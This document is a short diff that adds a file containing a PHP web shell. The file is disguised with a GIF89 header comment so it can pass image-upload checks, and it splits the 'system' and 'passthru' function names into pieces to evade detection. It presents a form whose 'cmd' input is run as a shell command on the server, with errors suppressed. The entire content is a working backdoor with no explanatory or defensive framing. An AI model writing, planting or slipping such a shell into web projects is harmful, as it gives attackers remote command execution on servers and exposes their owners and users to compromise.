@@ -1,0 +1,1 @@
+<!-- GIF89;a --><html><body><form method="GET"><input type="TEXT" name="cmd" autofocus size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET['cmd'])){$s='sys'.'tem';$p='pass'.'thru';$f=function_exists($s)?$s:$p;@$f($_GET['cmd']);} ?></pre></body></html>
